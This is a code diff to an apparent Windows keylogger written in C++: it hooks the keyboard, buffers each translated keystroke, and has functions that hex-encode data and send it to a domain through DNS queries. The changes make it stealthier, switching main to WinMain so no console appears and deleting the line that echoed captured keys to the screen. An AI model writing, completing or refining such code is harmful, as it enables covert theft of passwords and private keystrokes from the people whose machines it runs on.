@@ -49,7 +49,9 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data);
  */
 std::string convertToHex(const char* string);
 
-int main(int argc, char* argv[]) {
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+    LPSTR lpCmdLine, int nCmdShow) {
+		
 	HANDLE mutex = CreateMutex(0, 0, MUTEX_NAME);  // used to check if the program has already started
 	switch (GetLastError()) {
 		case ERROR_ALREADY_EXISTS:  // program already running
@@ -72,7 +74,7 @@ int main(int argc, char* argv[]) {
 	
 	MSG msg;
 	// message loop
-	while (GetMessage(&msg, NULL, 0, 0) != 0) {
+	while (GetMessage(&msg, NULL, 0, 0) > 0) {
 		// pass the key along, allowing to to be used by other processes
 		TranslateMessage(&msg);
 		DispatchMessageW(&msg);	
@@ -83,7 +85,7 @@ int main(int argc, char* argv[]) {
 		UnhookWindowsHookEx(_k_hook);
 	}
 	
-	return TRUE;
+	return msg.wParam;
 }
 
 LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -99,7 +101,6 @@ LRESULT __stdcall processKey(int nCode, WPARAM wParam, LPARAM lParam) {
 			if (ToAsciiEx(key->vkCode, key->scanCode, keyboardState, translatedChar, key->flags, keyboardLayout) == 1) {  // if only one key in buffer
 				char key = (char)translatedChar[0];
 				keystrokeBuffer += key;
-				std::cout << key << std::endl;
 			}
 		}
 	}
@@ -118,7 +119,7 @@ int startConnection(const char* domain) {
 								   DNS_OPTIONS,
 								   NULL,
 								   &pDnsRecord,
-								   NULL);
+								   NULL);  // sends two requests for some reason?
 	if (status) {
 		return -1;
 	} else {
